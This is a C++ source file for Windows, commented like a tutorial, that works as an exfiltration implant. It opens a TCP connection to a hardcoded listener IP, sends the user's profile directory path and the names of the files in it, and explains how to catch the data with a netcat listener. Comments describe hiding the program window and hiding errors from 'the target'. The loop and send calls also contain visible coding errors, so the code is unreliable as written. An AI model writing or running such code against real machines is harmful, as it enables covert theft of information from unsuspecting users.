/*
Compilation instructions:

In order for the compiler to include the windows socket library, one more thing needs to be done.

In DevC++, go to "Tools", click "Compiler options" and in the bottom box type " -lws2_32"

USAGE:

install netcat:
https://eternallybored.org/misc/netcat/

nc.exe -lvp 5555 (or the port you specified) <- For Windows
nc -lvp 5555 (or the port you specified) <- For Linux


*/


#define _WINSOCK_DEPRECATED_NO_WARNINGS /* we use winsock utilities and we do not want the compiler to complain about older functionalities used, since the below code is sufficient for our needs. */
#pragma comment(lib, "Ws2_32.lib") /* we need the Ws2_32.lib library in order to use sockets (networking) */


#include <stdio.h> //standard input/output utilities
#include <winsock2.h> //networking utilities
#include <iostream> //standard input/output utilities

#include <stdlib.h> //standard input/output utilities
#include <dirent.h> //directory utilities
#include <string> //string utilities

using namespace std;

char* userDirectory() { /* return a pointer to a string */
	char* pPath; // variable pointer to path
	pPath = getenv ("USERPROFILE"); /* we use the function getenv that is shipped with the previously included headers in order to know the user's directory location - in this case, it is kept in an environment variable of the Windows system called "userprofile" */ 
	if (pPath!=NULL){
		return pPath; //return directory path and exit function
	} else {
		perror(""); //else print error and exit
	}
}

int main (){
	//ShowWindow(GetConsoleWindow(), SW_HIDE); // hide this program window
	WSADATA WSAData; /* declaration of Structure (structure is a specific type of variable) holding information about windows socket implementation */
	SOCKET server; //variable used to store the connection of the SOCKET type
	SOCKADDR_IN addr; /* variable holding connection details - of SOCKADDR_IN type (also a struct) */
	
	WSAStartup(MAKEWORD(2,0), &WSAData); /* intialize usage of the winsock library (needed for opening a network connection) */
	server = socket(AF_INET, SOCK_STREAM, 0); // set up a TCP socket
	addr.sin_addr.s_addr = inet_addr("192.168.0.15"); /* specify the target of network connection - replace the ip with your listening ip address */
	addr.sin_family = AF_INET; /* set address family (AF) to AF_INET - this address family contains IPv4 addresses to be used to communicate over TCP */
	addr.sin_port = htons(5555); //remote port - change it to your listening port
	connect(server, (SOCKADDR *)&addr, sizeof(addr)); /* connect to the previously set up target host/port */
	
	char* pPath = userDirectory(); // get directory path
	send(server, pPath, sizeof(pPath), 0); //the path is sent to the penetration tester on the previously set ip address and port
	
	DIR *dir; //new var named dir: pointer to type DIR
	struct dirent *ent; //new variable named ent: pointer to structure
	if ((dir = opendir (pPath)) != NULL){ //if opening directory at retrieved path brings any results
	while ((ent - readdir (dir)) != NULL) { // iterate over items within the directory, as long as there are next items: 
	send(server, ent->d_name, sizeof(ent->d_name), 0); //send name of current item (file or directory contained within user's path) to the penetration tester
}
	closedir (dir); //close the directory that was read

} else {
	perror (""); //if there was an error opening the directory, print the error - this can be deleted from the final version if it works correctly so that the target does not see errors printed
}
	closesocket(server); //close the socket
	WSACleanup(); //clean up the Winsock library componets	
	//cout << userDirectory();
	//return 0;
}
